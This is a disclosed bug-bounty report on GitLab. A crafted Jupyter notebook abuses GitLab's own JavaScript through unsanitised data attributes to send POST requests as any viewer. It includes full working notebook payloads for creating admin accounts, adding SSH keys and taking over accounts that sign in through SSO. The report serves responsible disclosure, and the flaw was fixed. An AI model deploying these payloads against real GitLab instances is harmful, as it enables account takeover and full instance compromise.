---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/resource-injection
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Resource Injection"
enriched: true
body: true
date: 2022-05-20
submitted: 2021-11-24T23:18:42.001Z
bounty_usd: null
votes: 54
cve: []
program: "[[programs/gitlab|GitLab]]"
reporter: "joaxcar"
source: "https://hackerone.com/reports/1409788"
title: "Arbitrary POST request as victim user from HTML injection in Jupyter notebooks"
---
# Arbitrary POST request as victim user from HTML injection in Jupyter notebooks

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 54 | **Program:** GitLab | **Disclosed:** 2022-05-20

- Report: [https://hackerone.com/reports/1409788](https://hackerone.com/reports/1409788)
- CWE: Resource Injection
- Submitted: 2021-11-24T23:18:42.001Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Summary
An attacker can create a Jupyter notebook that will make arbitrary POST requests as the victim user. In the "worst case" an attacker could make an admin create a new admin account for the attacker. Other possible attack vectors are forcing invites to private projects etc. Every POST request is possible.

This research is loosely based on the issue with Rails Ujs data-* parameters. Nowadays DOMPurify strips Rails Ujs data- attributes such as data-url and data-method. What is not stripped is arbitrary data attributes. Looking through the code in https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/main.js , which is run on page load in the UI, I found multiple vectors still possible to abuse.

The script hooks up a lot of event listeners and modifications to the DOM. What is of particular interest for us is the part that is delayed to let additional data on the page load.

```
function deferredInitialisation() {
  const $body = $('body');

  initTopNav();
  initBreadcrumbs();
  initTodoToggle();
  initLogoAnimation();
  initServicePingConsent();
  initUserPopovers();
  initBroadcastNotifications();
  initPersistentUserCallouts();
  initDefaultTrackers();
  initFeatureHighlight();
```

Reading through the source files for these functions I managed to find multiple selector/data-attribute combinations that can be used even with purified HTML.

As an example we have persistent_user_callout in

https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/persistent_user_callout.js

where a POST request is made like

```
dismiss(event, deferredLinkOptions = null) {
    event.preventDefault();

    axios
      .post(this.dismissEndpoint, {
        feature_name: this.featureId,
      })
```

the `dissmissEndpoint` is controllable through a data attribute `data-dissmiss-endpoint`. The data attributes are extracted like so

```
export default class PersistentUserCallout {
  constructor(container, options = container.dataset) {
    const { dismissEndpoint, featureId, deferLinks } = options;
    this.container = container;
    this.dismissEndpoint = dismissEndpoint;
    this.featureId = featureId;
    this.deferLinks = parseBoolean(deferLinks);

    this.init();
  }
```

To be able to fire the dismiss function (and thus the POST request) we also need a `js-close` button

```
const closeButton = this.container.querySelector('.js-close');
```

The HTML needed to set this up is

```
<div class=\"js-new-user-signups-cap-reached\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\" data-defer-links=\"false\" data-feature-id=\"1\">
    <button style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close\">
        hack
    </button>
</div>
```

The styling is there to make the button as an invisible overlay over the whole page making it trigger on a click anywhere.

Now to the attack. If an attacker creates a Jupyter Notebook there exists the possibility to add HTML in the output fields. This HTML will be sanitized by DOMPurify, but this will not stop the attack.

A file like this will do as a simple POC

```
{
  "cells": [
    {
      "metadata": { "trusted": true },
      "cell_type": "code",
      "source": "<h1>asd</h1>",
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": "<IPython.core.display.HTML object>",
            "text/html": "<div class=\"js-feature-highlight\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\" data-auto-devops-help-path=\"hej\" data-highlight-id=\"1\">asdf</div>\n<div class=\"js-new-user-signups-cap-reached\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\" data-defer-links=\"false\" data-feature-id=\"1\"><button style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close\">hack</button></div>\n"
          },
          "metadata": {}
        }
      ]
    }
  ],
  "metadata": {
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3",
      "language": "python"
    },
    "language_info": {
      "name": "python",
      "version": "3.7.8",
      "mimetype": "text/x-python",
      "codemirror_mode": { "name": "ipython", "version": 3 },
      "pygments_lexer": "ipython3",
      "nbconvert_exporter": "python",
      "file_extension": ".py"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 4
}
```

I have added a `feature-highlight` (another possible vector, see image) just to show when the attack is successful. As the main.js script is run with a timer, sometimes one has to refresh the page to have the payload "load up" (this could possibly be worked around). When the attack is loaded, the highlight div will turn into a blue dot.

{F1525031}

Visiting this site and clicking anywhere will add a Todo on an Issue on one of my projects. I have also tested this attack with an attack creating an admin account. Replacing the payload in the POC with this one

```
"text/html": "<div class=\"js-new-user-signups-cap-reached\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/users?admin=true&email=joaxcarte01@wearehackerone.com&name=just&username=just&password=asdasdasdasd\" data-defer-links=\"false\" data-feature-id=\"1\"><button style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close\">.</button></div>\n"}
```

A visit by an admin to this site would end up with a new admin account being created.

Finally I want to point out that this kind of attack is possible anywhere where HTML injection could happen. Even with Purified HTML.

### Steps to reproduce
1. Create a project on GitLab.com
2. Create a new file named `hack.ipynb` (or upload the included file) with the content
{F1525030}
```
{
  "cells": [
    {
      "metadata": { "trusted": true },
      "cell_type": "code",
      "source": "<h1>asd</h1>",
      "execution_count": 1,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": "<IPython.core.display.HTML object>",
            "text/html": "<div class=\"js-feature-highlight\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\" data-auto-devops-help-path=\"hej\" data-highlight-id=\"1\">asdf</div>\n<div class=\"js-new-user-signups-cap-reached\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/projects/31573768/issues/1/todo\" data-defer-links=\"false\" data-feature-id=\"1\"><button style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close\">hack</button></div>\n"
          },
          "metadata": {}
        }
      ]
    }
  ],
  "metadata": {
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3",
      "language": "python"
    },
    "language_info": {
      "name": "python",
      "version": "3.7.8",
      "mimetype": "text/x-python",
      "codemirror_mode": { "name": "ipython", "version": 3 },
      "pygments_lexer": "ipython3",
      "nbconvert_exporter": "python",
      "file_extension": ".py"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 4
}
```
3. Click save
4. After saving you will land on the preview page for the file. If the out block does not contain a blue dot, refresh this page.
5. When the dot is blue click anywhere on the page
6. Now go to https://gitlab.com/dashboard/todos and check that a todo have been added

video example of the POC (note the todo being empty and the blue dot):

█████

### Impact

An attacker can make arbitrary POST requests as a victim user visiting a Jupyter notebook. Worst case giving the attacker admin access to the instance.

### Examples

Private project:
https://gitlab.com/parent02/sub2/asd/-/blob/main/hack.ipynb

### What is the current *bug* behavior?

DOMPurify does not filter out arbitrary data-* attributes, making it possible to high jack Gitlab UI JavaScript to make POST requests

### What is the expected *correct* behavior?

The attributes should not work in Jupyter notebooks

### Output of checks

This bug happens on GitLab.com

## Impact

An attacker can make arbitrary POST requests as a victim user visiting a Jupyter notebook. Worst case giving the attacker admin access to the instance.

## Timeline

- **Report Filed**
- **Report Needs More Info**
- **Report New**
- **2021-11-28** @joaxcar: Hi again, thought that I could share my latest research into this.

I have read through the code that is run as a part of the delayed initialization. I have not found any path leading to full XSS as long as the user controlled content that is to be displayed is loaded after the initial load. The delayed initialization contains the possibility of creating nav-bars, tooltips, popovers and more. The two obviously dangerous includes are

#### Feature Highlight

(https://gitlab.com/gitlab-org/gitlab/-/tree/master/app/assets/javascripts/feature_highlight) 

with the dataset
```
  const { autoDevopsHelpPath, highlight: highlightId, dismissEndpoint } = el.dataset;
```
Which will present the user with a popup when a user hovers over the blue dot that will replace the element with the js class `js-feature-highlight`. The popup contain a "confirm" button that on click will execute the function
```
export function dismiss(endpoint, highlightId) {
  return axios
    .post(endpoint, {
      feature_name: highlightId,
    })
    .catch(() =>
    );
}
```
And as the endpoint is controllable by the data-attribute `data-endpoint` which is not sanitized by DOMPurify we can make arbitrary post requests. This attack vector is usable but is not as "versatile" as the other one presented bellow. The feature highlight element is in my POC instead used to increase the success rate of the attack. As the feature highlight will replace the element on which we put the `js-feature-highlight` class we can add this class to a full screen link that will "refresh" the page on click and thus on the refresh mount the other payloads. When an attack mounts successfully the link will disappear and the underlying payloads will instead trigger on subsequent clicks.

#### Persistent User Callouts

(https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/persistent_user_callouts.js)

any of the following class-names will mount a persistent user callout to the DOM

```
const PERSISTENT_USER_CALLOUTS = [
  '.js-recovery-settings-callout',
  '.js-users-over-license-callout',
  '.js-admin-licensed-user-count-threshold',
  '.js-buy-pipeline-minutes-notification-callout',
  '.js-token-expiry-callout',
  '.js-registration-enabled-callout',
  '.js-new-user-signups-cap-reached',
  '.js-eoa-bronze-plan-banner',
  '.js-security-newsletter-callout',
];
```

any element with one of these class-names will trigger the code in https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/persistent_user_callout.js where we can control the dataset
```
const { dismissEndpoint, featureId, deferLinks } = options;
```

By data-attributes that will not get sanitized by DOMPurify. As with feature highlights there is a post request possible on click. This time we have two kind of events
```
const closeButton = this.container.querySelector('.js-close');
const followLink = this.container.querySelector('.js-follow-link');
```
The `followLink` will trigger a POST request which is followed by a link trigger if the element has an `href` attribute
```
    const { href } = event.currentTarget;

    axios
      .post(this.dismissEndpoint, {
        feature_name: this.featureId,
      })
      .then(() => {
        window.location.assign(href);
```

The `closeButton` will instead allow us to add another selector to trigger searching the subtree for a link tag with the class-name `deffered-link` and then trigger this POST request
```
axios
      .post(this.dismissEndpoint, {
        feature_name: this.featureId,
      })
      .then(() => {
        this.container.remove();

        if (deferredLinkOptions) {
          const { href, target } = deferredLinkOptions;
          window.open(href, target);
        }
      })
```

We can see here that the POST is instead followed by opening the link by `window.open`. As `target` is not allowed by DOMPurify this value will be `undefined`, the `window.open` will default to open the link in a new tab. As there is no `noopener` in the call (ex `window.open('https://www.your.url','_blank','noopener')`) this redirect can be used for "Tabnabbing".

### Attack scenario

```
[
"<a class=\"js-feature-highlight\" style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1001\">.</a>",

"<div class=\"js-new-user-signups-cap-reached\"  data-dismiss-endpoint=\"PAYLOAD" data-defer-links=\"true\" data-feature-id=\"1\">",
 
"<a href=\"https://joaxcar.com\" style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close deferred-link\">",
        ".",
    "</a>",
"</div>"
]
```
This attack contains a "refresh link" and one subsequent POST attack. The POST attack can be expanded to trigger multiple POST requests as long as the victim continuous to click on the page. This is due to the fact that each triggered POST is a "dismiss" of the persistent callout. The attacker can thus "stack" multiple persistent callouts with lower z-index that will be exposed after successful triggers. I have recorded a video where I make 3 POST request and where only the last one has a  `deffered link` which opens a new tab, with witch I then performs a tabnabb.

To help with testing the POC I suggest using the POST request `users/:id/follow` instead of my initial `todo` example. Just put any ID in the link.

To mention two critical POSTs that are available to an attacker there is "adding SSH key" (https://docs.gitlab.com/ee/api/users.html#add-ssh-key) which will grant the attacker Git access to the users repositories. And the "user creation" (https://docs.gitlab.com/ee/api/users.html#user-creation) where an Admin can dreate other admins. The attacker can use the "link" functionality to send a request to its server to inform about a successful attack.

██████

The POC is here
{F1528205}

Best regards
Johan
- **Report Needs More Info**
- **Report New**
- **2021-11-30** @joaxcar: A new recording, hope the POC is clear enough. There are some SSH keys that are not compatible with getting sent in the url parameters so I use one that I know work. If the payload says that the fingerprint is taken, just generate a new one!

█████
- **2021-11-30** @joaxcar: @forest_dweller and here is the admin POC. This one is done on my local instance but should work the same on GitLab.com if I had an admin account there :)

edit: This POC requires the victim user to be an admin

████

Use the same base .ipynb file but replace the content of the infected cell to
```
"text/html": [
              "<a href=\"https://gitlab.example.com/user_02/asdasd/-/blob/main/test.ipynb\" class=\"js-feature-highlight\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/todos/147611488/mark_as_done\" data-auto-devops-help-path=\"hej\" data-highlight-id=\"1\" style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1001\">.</a>",
            "<div class=\"js-new-user-signups-cap-reached\" data-dismiss-endpoint=\"https://gitlab.example.com/api/v4/users?admin=true&email=joaxcar@wearehackerone.com&name=newadmin&username=newadmin&password=asdasdasdasd&skip_confirmation=true\" data-defer-links=\"false\" data-feature-id=\"1\">",
            "<button style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close\">",
            "hack",
            "</button>",
            "</div>"
            ]}
```
The first part is a "refresher" again (I also forgot to mention that it is important to update this link to point at the current file, so that you dont end up at another file when refreshing). The second part makes a call to the endpoint
```
https://gitlab.example.com/api/v4/users?admin=true&email=joaxcar@wearehackerone.com&name=newadmin&username=newadmin&password=asdasdasdasd&skip_confirmation=true
```
which will create a new user that is an admin and already activated (skip_confirmation). Now the attacker have full access to the instance. Again a trailing redirect could be used to notify the attacker that the payload was successful.

If there is anything more I can add just reach out again.

Best regards
Johan
- **2021-11-30** @joaxcar: I am going to try to clean this up a bit. The report got a bit verbose, so here is a TLDR:

### Minimal working POC
Put this in a file named `name.ipynb`, and save it. This POC uses the simplest but least impactful of the two JavaScript classes described above. But it allows for a clean way to just prove that a POST is sent. I have striped as much Notebook text as I could without breaking rendering. I also realized that the "refresh" functionality can be achieved by simply emitting any link in the `href`.

So if the payload does not mount, just click the link to refresh the page. When it mounts it will turn to a blue dot. Hover over the dot to get a popup, click the "OK" button to trigger the POST request. In this POC it makes a request to follow one of my GitLab accounts. (This is the FULL file content, nothing else is needed)

```
{
  "cells": [
    {
      "cell_type": "code",
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<a href class=\"js-feature-highlight\" data-dismiss-endpoint=\"https://gitlab.com/api/v4/users/8891840/follow\">",
              "click to refresh",
              "</a>"
            ]
          }
        }
      ]
    }
  ]
}
```

### Make it dangerous
Replace the `data-dismiss-endpoint` in the POC above with either the "create admin" or the "add ssh key" from my POCs above

* `api/v4/users?admin=true&email=joaxcar@wearehackerone.com&name=newadmin&username=newadmin&password=asdasdasdasd&skip_confirmation=true`
* `api/v4/user/keys?title=hack&key=KEYPHINGERPRINT`

### What is the problem
"Safe HTML" is generated in GitLab by using DOMPurify. The configuration as of now does NOT strip

* Style tags and attributes (I know you are working on this)
* Arbitrary `data-*` attributes.
* Arbitrary class names

Which makes it possible to abuse GitLab's own JS code when the user can inject html. In this case Notebooks is used for this as they allow html in cells.

As a bonus the `persistant user callout` code contains a `window.open` call that can be used for tabnabbing. It is also important to note that the exposed code (`persistant user callout`) allows for "stacking" multiple payloads that can be executed after each other if the user continue to interact with the page.

Hope that clears things up. Sorry for not taking the time to clean it up prior to reporting, but I kind of figured it out as I was revisiting the issue.

Best regards
Johan
- **2021-12-02** @joaxcar: Hi again @forest_dweller , I know that triaging can take some time and I have no problem waiting. I just wanted this report to be submitted in the timeframe for GitLab bug contest ( https://about.gitlab.com/blog/2021/11/01/3rd-annual-bug-bounty-contest/#----three-year-anniversary-hacking-contest--- ) which have its deadline tomorrow (3d dec). Hopefully it does not matter if it gets triaged after the deadline, but as you managed to reproduce the base issue maybe we could send it to GitLab triage team?

Maybe not the critical impact that will blow all the competition out of the way, but I like to have a tiny chance of some nice swag :)

Best regards
Johan
- **2021-12-02** @dcouture: Hey @joaxcar,

I only saw your last message and didn't look at the rest of the report yet, but the contest works with with submission date so you're fine. ;)

Best regards,
Dominic
GitLab Security Team
- **Report Vulnerability Types Updated**
- **Report Pending Program Review**
- **Report Triaged**
- **Bounty Awarded**
- **2021-12-07** @joaxcar: Thank you @forest_dweller for looking at the report and triaging it. I realized that my video with the SSH key lost the grand finale, as I had to re-record it. It was supposed to end with a shell command proving that the SSH key did get activated on the user. But If you try it yourself, you see it works! :)

And thank you @dcouture for triaging and the bounty! I started to look into the possibility to abuse the fact that GraphQL mutations can be stacked to perform multiple mutations in one POST request. But as the GraphQL API at the moment don't contain any actions as dangerous as "create admin user", I did not dig too deep into it. I will get back if I find some interesting vector there.
- **2022-01-19** @gitlab-securitybot: ETA for fix:

Hi @joaxcar,

The issue you reported is currently scheduled to be fixed by 2022-02-28.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2022-01-31** @joaxcar: Hi team and @dcouture , I know that this one is planned to get fixed soon, but I have some additional updates. I have managed to escalate this bug to a full account takeover under specific conditions on GitLab.com. 

This is of interest as an "admin takeover" as described above might be tricky to pull of on GitLab.com. But account takeover of regular users on the main platform is a big security risk. The attack only works if the user uses an SSO (single sign on) flow to authenticate to GitLab and have never set up a "real password" to the account. I don't know how prevalent this is but should not be too uncommon as SSO through Google account is a common way to sign up to other applications.

When a user wants to update the account password, the regular flow is to go to https://gitlab.com/-/profile/password/edit and enter

1. Your old password (for protection against fraudulent updates)
2. The new password
3. The new password a second time

It turns out that if the user have signed up with SSO there is no "old password" field and the user can set a password to the account just by entering

1. New password
2. New password again

When clicking on "Save" a `POST` request is made with the body content of

* `_method=put`
* `authenticity_token=AUTENTICITY_TOKEN`
* `user[new_password]=PASSWORD`
* `user[password_confirmation]=PASSWORD`

This is a `PUT` request functionality made within a `POST` request. And as it turns out, the `authenticity_token` can be omitted IF a `X-Csrf-Token` header is present in the request. This makes this a candidate to use in the reported arbitrary `POST` attack described in this report. As an example, using this POC 
```json
{
  "cells": [
    {
      "cell_type": "code",
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": [
              "<a href class=\"js-feature-highlight\" data-dismiss-endpoint=\"https://gitlab.com/-/profile/password?_method=put&user%5Bnew_password%5D=Hacker001&user%5Bpassword_confirmation%5D=Hacker001\">",
              "click to refresh",
              "</a>"
            ]
          }
        }
      ]
    }
  ]
}
```
The request that is sent to `https://gitlab.com/-/profile/password` would add the password Hacker001 to the victim account if a password were not already present (due to SSO). The attacker now has complete control over the victim account.

Compared to the previously mentioned attacks this is not as critical as gaining admin access, but worse than getting SSH access as a complete account takeover could lead to identity theft and in the worst case spread to let the attacker take over subsequent accounts on other platforms if SSO is handled poorly by the user.

And to expand even further on the underlying issue here: There are a lot of settings and modifications to a user's profile and data that uses the same scheme of using `POST` requests with parameters like `_method=PUT`, `_method=DELETE` and `_method=PATCH` and the `authenticity_token` instead of proper HTTP methods and `X-Csrf-Token` header. They all seam to be possible to target with the `arbitrary POST` attack (especially as multiple sequential requests are achievable). Some interesting ones are

* Adding an email address and changing the user notification email to the attacker's newly added email
    1. `POST /-/profile/emails email[email]=asd@asd.se`
    2. `POST /-/profile/notifications _method=put&user[notification_email]=asd@asd.se&user[email_opted_in]=0`

* Changing project visibility settings (`_method=PATCH`) trough calls to `/GROUP/PROJECT`

* Deleting a project/group (`_method=DELETE`) through a call to `/GROUP/PROJECT`

* Changing use profile (name, bio, links) through (`_method=PUT`) calls to `/-/profile`

### Question
I actually think that the issue of not requiring any additional confirmation when adding the first password after SSO constitutes a security risk on its own (as any `arbitrary POST` or `XSS` could abuse the same vector). But I don't know if it is possible to report an issue that rely on additional security flaws to be achievable. So I thought that I will put it here as it does add to the attack performable by the initial report. __Is this issue worth reporting on its own, or should I just leave it?__

Best regards
Johan
- **2022-01-31** @dcouture: Hi @joaxcar,

Thanks for the details. It's not worth reporting on its own for the reason you pointed out (it relies on additional security flaws) but it will be considered when assessing the full impact of your report.

Best regards,
Dominic
GitLab Security Team
- **Report Severity Updated**
- **Report Resolved**
- **Bounty Awarded**
- **2022-02-07** @joaxcar: Wow thank you for an amazing bounty GitLab and @dcouture ! even if I am still sad that I did not make it all the way to the  keyboard swag.. Will have to step up my game until the next "end of year" event :)

I have confirmed that the patch mitigates the immediate risk described in the report. I guess that you are aware of it, but thought that I could still mention that the fix only effect Notebook output cells. Which mean that similar attacks are possible if HTML injections are found elsewhere on the platform. Even if the output is filtered with `v-html-safe`, as your default DOMpurify settings allows for arbitrary data attributes (minus the rails ones).

Again great job and thank you for the award!

Best regards
Johan
- **Agreed On Going Public**
- **2022-05-20** @joaxcar: Hi @dcouture just a ping for the request to disclose if possible? Removing videos would be great, otherwise there is nothing sensitive there.

Best regards
Johan
- **Agreed On Going Public**
- **Report Became Public**
